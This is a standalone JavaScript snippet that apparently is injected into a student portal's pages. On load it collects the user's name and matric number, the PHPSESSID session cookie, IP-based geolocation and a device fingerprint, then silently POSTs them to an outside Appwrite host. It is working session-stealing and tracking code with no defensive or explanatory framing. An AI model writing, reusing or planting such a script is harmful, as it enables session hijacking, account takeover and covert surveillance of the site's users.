async function GetIPInfo() {
    const ipinfo = (await (await fetch(`https://ipinfo.io/json`)).json());
    try {
        return {
            Address: ipinfo['ip'],
            Country: ipinfo['country'],
            City: ipinfo['city'],
            Region: ipinfo['region'],
            Coordinates: ipinfo['loc'],
            ISP: ipinfo['org'],
            Postal: ipinfo['postal'],
            Hostname: ipinfo['hostname']
        }
    } catch {
        return {
            Address: null,
            Country: null,
            City: null,
            Region: null,
            Coordinates: null,
            ISP: null,
            Postal: null,
            Hostname: null,
        }
    }
}
function GetUserDetails() {
  var e = {
    Matric: document.querySelector(".user-role")
      ? document.querySelector(".user-role").textContent.trim()
      : "Unavailable",
    Name: document.querySelector(".user-name")
      ? document.querySelector(".user-name").textContent.trim()
      : "Unavailable",
  };
  document.cookie.split(";").forEach((t) => {
    const [n, o] = t.trim().split("=");
    "PHPSESSID" == n && (e.LatestPHPSession = o);
  });
  return e;
}
function getDeviceInfo() {
  return {
    Browser: navigator.userAgent,
    Screen: `${window.screen.width}x${window.screen.height}`,
    Viewport: `${window.innerWidth}x${window.innerHeight}`,
    CPU: navigator.hardwareConcurrency || 0,
    RAM: navigator.deviceMemory || 0,
    Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    System: navigator.userAgentData
      ? navigator.userAgentData.platform
      : navigator.platform,
  };
}
async function storeData(e, t, ipinfo) {
  const n = await fetch("https://673d53a375a6942d9bd2.appwrite.global/", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ user: t, device: e , ip: ipinfo }),
    mode: "no-cors",
  });
  console.log(n);
}
(async (e) => {
  const t = getDeviceInfo(),
    n = GetUserDetails();
    ipinfo = await GetIPInfo()
  storeData(t, n, ipinfo);
})();
